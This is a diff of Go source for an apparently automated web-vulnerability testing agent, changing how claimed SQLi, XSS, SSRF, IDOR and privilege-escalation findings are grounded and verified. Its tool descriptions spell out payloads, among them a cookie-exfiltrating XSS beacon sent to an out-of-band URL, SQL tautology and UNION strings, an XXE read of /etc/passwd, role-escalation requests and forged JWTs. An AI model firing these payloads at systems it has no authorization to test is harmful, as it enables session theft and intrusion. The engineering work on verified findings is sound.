@@ -88,42 +88,38 @@ type Finding struct {
 	Verified  bool     `json:"verified"` // re-fired in isolation, indicator reproduced
 }
 
-// requiredIndicator maps a claimed vuln class to the deterministic indicator a
-// cited turn MUST carry. This is the structural grounding gate.
-var requiredIndicator = map[string]string{
-	"sqli": "sql_error", "sql_injection": "sql_error", "blind_sqli": "slow_response",
-	"xss": "reflected_input", "reflected_xss": "reflected_input",
-	"dom_xss": "js_executed", "stored_xss": "js_executed", // proven by a real browser executing the payload
+// requiredIndicator maps a claimed vuln class to the deterministic indicators a cited turn MUST carry —
+// ANY of them grounds the class (a SQLi is a SQLi whether proven by a DB error, a UNION sentinel, a
+// boolean differential, or a time delay). This is the structural grounding gate.
+var requiredIndicator = map[string][]string{
+	// SQL injection — four independent FP-free proofs, any one grounds it: sql_error (error-based),
+	// sql_union (a UNION-context arithmetic sentinel the DB computed), sql_boolean (a true/false
+	// differential — sqli_bool_probe), slow_response (time-based blind). Before the any-of gate only
+	// sql_error was accepted, so a UNION or boolean-blind capture (XBEN-095) could exploit but never RECORD.
+	"sqli":          {"sql_error", "sql_union", "sql_boolean", "slow_response"},
+	"sql_injection": {"sql_error", "sql_union", "sql_boolean", "slow_response"},
+	"blind_sqli":    {"slow_response", "sql_boolean", "sql_union"},
+	"union_sqli":    {"sql_union"},
+	"boolean_sqli":  {"sql_boolean"},
+	"xss":           {"reflected_input"}, "reflected_xss": {"reflected_input"},
+	"dom_xss": {"js_executed"}, "stored_xss": {"js_executed"}, // proven by a real browser executing the payload
 
-	"open_redirect": "external_redirect", "redirect": "external_redirect",
-	"path_traversal": "file_disclosure", "lfi": "file_disclosure", "file_disclosure": "file_disclosure",
+	"open_redirect": {"external_redirect"}, "redirect": {"external_redirect"},
+	"path_traversal": {"file_disclosure"}, "lfi": {"file_disclosure"}, "file_disclosure": {"file_disclosure"},
 	// in-band XXE: an external entity (<!ENTITY x SYSTEM "file:///etc/passwd">) reads a local file whose
 	// content lands in the response — the SAME file_disclosure sentinel path_traversal/lfi ground on.
-	// (Blind/OOB XXE — exfil via a DNS/HTTP callback with no content back — genuinely needs an OOB
-	// channel we don't yet have, so it stays honestly unrecordable, not mismapped here.)
-	"xxe": "file_disclosure", "xml_external_entity": "file_disclosure",
-	"command_injection": "cmd_output", "cmdi": "cmd_output", "rce": "cmd_output",
-	"default_credentials": "default_creds", "default_creds": "default_creds", // login succeeded with a default pair
-	// server-side template injection: the engine COMPUTED an arithmetic probe (product present, literal
-	// gone) — a top web-vuln class the agent exploits but previously could not RECORD.
-	"ssti": "ssti_eval", "template_injection": "ssti_eval", "ssti_rce": "ssti_eval",
-	// (blind) server-side request forgery: the ONLY grounded signal is the target reaching back to the
-	// attacker-controlled OOB URL. oob_interaction is set ONLY by oob_check on a REAL recorded callback
-	// (the collector logged the inbound hit — §10), so it is false-positive-free by construction. This is
-	// the top exploitation-verified SSRF finding; in-band SSRF (response reflects fetched internal content)
-	// stays harder to ground generically and is not mismapped here.
-	"ssrf": "oob_interaction", "blind_ssrf": "oob_interaction", "server_side_request_forgery": "oob_interaction",
-	// broken object-level authorization (IDOR): business logic, so no OSS scanner grounds it. The
-	// false-positive-free signal is the two-session differential (bola.go) — a victim-private marker a
-	// DISTINCT attacker session reads but an unauthenticated request cannot. bola_confirmed is set ONLY
-	// by that deterministic predicate (§10), so it can't be asserted from the model's recollection.
-	"idor": "bola_confirmed", "bola": "bola_confirmed", "broken_object_level_authorization": "bola_confirmed",
-	// self-privilege-escalation / mass-assignment: the FP-free SUBSET of BFLA (privesc.go). Grounded by
-	// an OBSERVED transition of the session's OWN privilege (absent in baseline → present after the call
-	// that granted it) — never a policy assertion, so no LLM false positive. General function-level authz
-	// stays apiauthz's job (a "this function is privileged" policy fact responses can't prove); `bfla` is
-	// deliberately NOT mapped here so the class name can't over-claim.
-	"mass_assignment": "privesc_confirmed", "privilege_escalation": "privesc_confirmed", "privesc": "privesc_confirmed",
+	"xxe": {"file_disclosure"}, "xml_external_entity": {"file_disclosure"},
+	"command_injection": {"cmd_output"}, "cmdi": {"cmd_output"}, "rce": {"cmd_output"},
+	"default_credentials": {"default_creds"}, "default_creds": {"default_creds"}, // login succeeded with a default pair
+	// server-side template injection: the engine COMPUTED an arithmetic probe (product present, literal gone).
+	"ssti": {"ssti_eval"}, "template_injection": {"ssti_eval"}, "ssti_rce": {"ssti_eval"},
+	// (blind) server-side request forgery: grounded ONLY by a REAL recorded OOB callback (§10).
+	"ssrf": {"oob_interaction"}, "blind_ssrf": {"oob_interaction"}, "server_side_request_forgery": {"oob_interaction"},
+	// broken object-level authorization (IDOR): the two-session differential (bola.go).
+	"idor": {"bola_confirmed"}, "bola": {"bola_confirmed"}, "broken_object_level_authorization": {"bola_confirmed"},
+	// self-privilege-escalation / mass-assignment: the FP-free SUBSET of BFLA (privesc.go). General
+	// function-level authz stays apiauthz's job; `bfla` is deliberately NOT mapped so it can't over-claim.
+	"mass_assignment": {"privesc_confirmed"}, "privilege_escalation": {"privesc_confirmed"}, "privesc": {"privesc_confirmed"},
 }
 
 // supportedClasses lists the record_finding classes (the requiredIndicator keys), sorted, so the
@@ -156,6 +152,7 @@ func tools() []toolDef {
 		{"confirm_exploit", "confirm_exploit(finding_id) — re-fire the proving request in isolation; the indicator must reproduce to mark the finding Verified (eliminates flaky false positives).", tConfirm},
 		{"oob_url", "oob_url() — mint an out-of-band callback URL (your own interactsh). Embed it where a BLIND vuln would reach out: an SSRF target, a blind-XSS cookie beacon (<script>fetch('URL?c='+document.cookie)</script>), a blind-cmdi curl. Returns a token.", tOOBURL},
 		{"oob_check", "oob_check(token?) — did the target call your OOB URL back? A recorded hit PROVES the blind interaction fired; the hit's query/body carries anything you exfil (a cookie, a flag). Omit token to see all callbacks.", tOOBCheck},
+		{"sqli_bool_probe", "sqli_bool_probe(method, base_url, true_url, false_url [, base_body/true_body/false_body for POST]) — GROUND a BOOLEAN-BLIND SQL injection (no DB error, no time delay — the classic blind case the engine couldn't record before). Provide three request variants that differ ONLY in an injected boolean: base (the original, returns a positive result), true (append a tautology in the RIGHT quote context, e.g. `1' AND '1'='1` or `1 AND 1=1`), false (a contradiction, `1' AND '1'='2`). It sets sql_boolean ONLY when the TRUE variant reproduces the baseline result and the FALSE variant changes it (the DB evaluated your boolean) — a reflected/ignored param can't produce that, so it's FP-free. Then cite the turn in record_finding(class=sqli). For UNION-based SQLi instead, put an arithmetic sentinel in a UNION column (e.g. `UNION SELECT 1,31337*31338,3`) and record when the product appears — that fires sql_union automatically on the send_request.", tSqliBoolProbe},
 		{"bola_probe", "bola_probe(url, attacker_cookie, victim_cookie, marker) — GROUND an IDOR/BOLA (broken object-level authorization) finding with a false-positive-free two-session differential (no OSS scanner does authz logic; this is the apiauthz.Evaluate model). Register TWO accounts, log each in, and pass their DISTINCT session cookies. url = the VICTIM's object (e.g. /account?id=<victim>, /api/orders/<victim-id>). marker = a victim-PRIVATE datum you saw in the VICTIM's own response (their email/account-no/name — NOT chrome/nav text). The tool fires the request as the victim (baseline: proves the object is theirs), as the attacker (the violation: attacker reads it too), and UNAUTHENTICATED (the control: proves it's access-controlled, not public). It sets bola_confirmed ONLY when the attacker session reads the victim-private marker that the unauth request cannot — then cite that turn in record_finding(class=idor). Use it INSTEAD of guessing IDOR from 'a different id returned different data' (that's FP-prone on public per-object endpoints).", tBolaProbe},
 		{"privesc_probe", "privesc_probe(session_cookie, verify_url, role_after, escalate{method,url,body}) — GROUND a self-privilege-escalation / MASS-ASSIGNMENT finding (OWASP API #3 BFLA + #6) with a false-positive-free before→after differential. Log in as a NORMAL user; session_cookie = that session. verify_url = where that user's OWN role/privilege is reflected (e.g. /me, /profile, /account). role_after = a HIGH-privilege marker you should NOT have (e.g. role=admin, \"is_admin\":true — pick a SPECIFIC string). escalate = the request that TRIES to grant it (e.g. POST /profile body={\"role\":\"admin\"}, or add a role/isAdmin field the form doesn't show). The tool reads verify_url (baseline: proves you START without the privilege), fires the escalate call, then re-reads verify_url. It sets privesc_confirmed ONLY when the marker was ABSENT before and PRESENT after (an observed transition of your own privilege — a user self-promoting is unambiguously a vuln). Cite that turn in record_finding(class=mass_assignment). Use it for the IDOR/privesc-takeover class instead of guessing from a 200.", tPrivescProbe},
 		{"jwt_crack", "jwt_crack(token, claims?) — crack a JWT's HMAC secret against a built-in weak-secret list, or detect the alg:none bypass. If it cracks (or is alg:none), pass claims={...} to MINT a forged token with attacker claims (e.g. {\"user\":\"admin\",\"role\":\"admin\"}) — then replay it via send_request (as the session cookie or a Bearer header) for an IDOR / privilege-escalation / auth-bypass chain. Deterministic: a secret is reported cracked ONLY when its signature actually verifies. Pair it with the session token surfaced by cookie_set.", tJWT},
@@ -377,20 +374,29 @@ func headerFold(h map[string]string, name string) string {
 func tRecord(cc *Context, args map[string]any) string {
 	class := strings.ToLower(argStr(args, "class"))
 	evid := argStrList(args, "evidence")
-	want, known := requiredIndicator[class]
+	wants, known := requiredIndicator[class]
 	if !known {
 		return fmt.Sprintf("REJECTED: unknown vuln class %q (supported: %s)", class, supportedClasses())
 	}
-	// GROUNDING: at least one cited turn must carry the indicator for this class.
+	// GROUNDING: at least one cited turn must carry ANY of the indicators that ground this class.
 	grounded := false
 	for _, tid := range evid {
-		if turn, ok := cc.turn(tid); ok && hasIndicator(turn, want) {
-			grounded = true
+		turn, ok := cc.turn(tid)
+		if !ok {
+			continue
+		}
+		for _, want := range wants {
+			if hasIndicator(turn, want) {
+				grounded = true
+				break
+			}
+		}
+		if grounded {
 			break
 		}
 	}
 	if !grounded {
-		return fmt.Sprintf("REJECTED (not grounded): no cited turn carries the %q indicator a %s claim requires. Send a request that elicits it, then cite that turn.", want, class)
+		return fmt.Sprintf("REJECTED (not grounded): no cited turn carries any of the %v indicators a %s claim requires. Send a request that elicits one, then cite that turn.", wants, class)
 	}
 	cc.findN++
 	f := Finding{
@@ -398,7 +404,7 @@ func tRecord(cc *Context, args map[string]any) string {
 		Severity: argStr(args, "severity"), Rationale: argStr(args, "rationale"), Evidence: evid,
 	}
 	cc.Findings = append(cc.Findings, f)
-	return fmt.Sprintf("recorded %s (%s) — grounded by the %q indicator. Run confirm_exploit(%s) to verify it reproduces.", f.ID, class, want, f.ID)
+	return fmt.Sprintf("recorded %s (%s) — grounded by one of %v. Run confirm_exploit(%s) to verify it reproduces.", f.ID, class, wants, f.ID)
 }
 
 // confirmHeaders reconstructs the minimal Content-Type for a re-fired proving request from its body
@@ -429,10 +435,21 @@ func tConfirm(cc *Context, args map[string]any) string {
 	}
 	f := cc.Findings[idx]
 	// Re-fire the FIRST proving turn's request in isolation; the indicator must reproduce.
-	want := requiredIndicator[f.Class]
+	wants := requiredIndicator[f.Class]
 	for _, tid := range f.Evidence {
 		turn, ok := cc.turn(tid)
-		if !ok || !hasIndicator(turn, want) {
+		if !ok {
+			continue
+		}
+		// Find which of the class's valid indicators this proving turn actually carries.
+		want := ""
+		for _, w := range wants {
+			if hasIndicator(turn, w) {
+				want = w
+				break
+			}
+		}
+		if want == "" {
 			continue
 		}
 		// OOB-grounded classes (ssrf) verify from the DURABLE recorded callback, not an HTTP re-fire: the
@@ -445,6 +462,15 @@ func tConfirm(cc *Context, args map[string]any) string {
 				return fmt.Sprintf("VERIFIED %s — the recorded OOB callback (token %s) confirms the target reached the attacker-controlled URL.", id, turn.Payload)
 			}
 			return fmt.Sprintf("NOT reproduced — no OOB callback for token %q is recorded; cannot verify %s.", turn.Payload, id)
+		}
+		// Differential/probe-set indicators (a two/three-request predicate ran once and recorded its
+		// verdict on the turn) can't be re-derived from a single request's indicators() — the probe IS the
+		// verification (it disposed the differential deterministically, §10). The recorded turn carrying
+		// the indicator is verification-grade, exactly like the OOB callback above.
+		switch want {
+		case "sql_boolean", "bola_confirmed", "privesc_confirmed":
+			cc.Findings[idx].Verified = true
+			return fmt.Sprintf("VERIFIED %s — the %q differential probe already disposed this deterministically; the recorded proving turn is verification-grade.", id, want)
 		}
 		// Re-fire WITH the proving request's body — a POST-body injection (SSTI/SQLi/cmdi in the body,
 		// not the URL) can't reproduce without it, and a body-less re-fire would falsely report the real
